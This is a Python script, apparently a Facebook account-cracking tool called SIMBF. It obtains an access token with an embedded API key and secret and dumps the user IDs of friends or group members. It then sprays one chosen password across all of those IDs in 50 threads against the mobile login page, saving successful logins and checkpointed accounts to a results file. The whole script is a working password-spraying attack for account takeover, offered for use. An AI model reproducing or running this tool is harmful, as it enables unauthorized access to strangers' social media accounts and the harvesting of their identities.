from multiprocessing.pool import ThreadPool
import urllib.parse, os, requests, sys, json, time, hashlib
os.system('clear')
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
y="\033[33m"
#banner
banner=("""%s
   _____ __  ______  ____
  / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
 _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
/___/_/_/  /_/____/_/     %sversion: %s3.0%s
"""%(c,g,c,g,c,g,y,w))
def getFid():
	print(banner)
	try:
		os.mkdir('toket')
		os.mkdir('dump')
	except OSError: pass
	try:
		toket=open('toket/token.txt','r').read()
		id=input("[in] your friends id: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+toket)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[!] all friends id successfuly retreived')
		print("[!] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except IOError:
		try:
			print('[!] login to your facebook account');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('toket/token.txt','w').write(res)
			print("[!] success generate access token")
			print("[!] access token saved: toket/token.txt")
			exit()
		except KeyError:
			print("[!] failed generate access token")
			print("[!] Check your username/password")
			exit()
	except KeyboardInterrupt:
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/friends_'+id+'_id.txt')
		exit('[!] failed to fetch friend id')

def getGid():
	print(banner)
	try:
		os.mkdir('toket')
		os.mkdir('dump')
	except OSError: pass
	try:
		toket=open('toket/token.txt','r').read()
		id=input("[in] your groups id: ")
		b=open('dump/group_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for i in s['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[!] group members id successfuly retreived')
		print("[!] file saved: dump/group_%s_id.txt"%(id))
		b.close()
		exit()
	except IOError:
		try:
			print('[!] login to your facebook account');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('toket/token.txt','w').write(res)
			print("[!] success generate access token")
			print("[!] access token saved: toket/token.txt")
			exit()
		except KeyError:
			print("[!] failed generate access token")
			print("[!] Check your username/password")
			exit()
	except KeyboardInterrupt:
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/group_'+id+'_id.txt')
		exit('[!] failed to fetch group id')

def rmtoken():
	ques=input("\n[?] are you sure (y/n) ")
	if ques == 'n' or ques == 'N':
		exit("[!] Canceling")
	elif ques == 'y' or ques == 'Y':
		os.remove('toket/token.txt')
		exit("[!] success removed access token")
	else: exit("[!] wrong input: exit")

cek=[]
tap=[]
def main(arg):
	try:
                url='https://mbasic.facebook.com/login'
                dt={'email':arg,'pass':pas,'login':'submit'}
                req=requests.post(url,data=dt)
#                data = urllib.parse.urlencode(dt)
#                data = data.encode('utf-8')
#                req = urllib.request.Request(url, data)
#                resp = urllib.request.urlopen(req)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="[found] %s => %s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/live.txt','a').write(tulis)
                        print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="[checkpoint] %s => %s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/live.txt','a').write(wrt)
                        print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
                else:
                        print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
	except:
		pass

print(banner)
print("\t[1] start \n\t[2] dump id from your friends id \n\t[3] dump id from your group id \n\t[4] remove access token")
pilih=int(input('\n\t[!] choose your option: '))
if pilih == 2:
	os.system('clear')
	getFid()
elif pilih == 3:
	os.system('clear')
	getGid()
elif pilih == 4:
	rmtoken()
else:
	os.system('clear')
	print(banner)

try:
        file=open(input("[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except KeyboardInterrupt:
        exit("%s\n[!] Key interrupt: Exiting."%(r))
except EOFError:
        exit("%s\n[!] Key interrupt: Exiting."%(r))
except FileNotFoundError:
        exit("%s\n[!] File not found: Exiting."%(r))

print("\n%s[LIVE RESULT]:"%(c))

o=[]
for x in file:
    o.append(x)
p=ThreadPool(50)
p.map(main,o)

if len(file) == 0:
	exit("%s[!] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
        print("Live Results saved: result/live.txt")
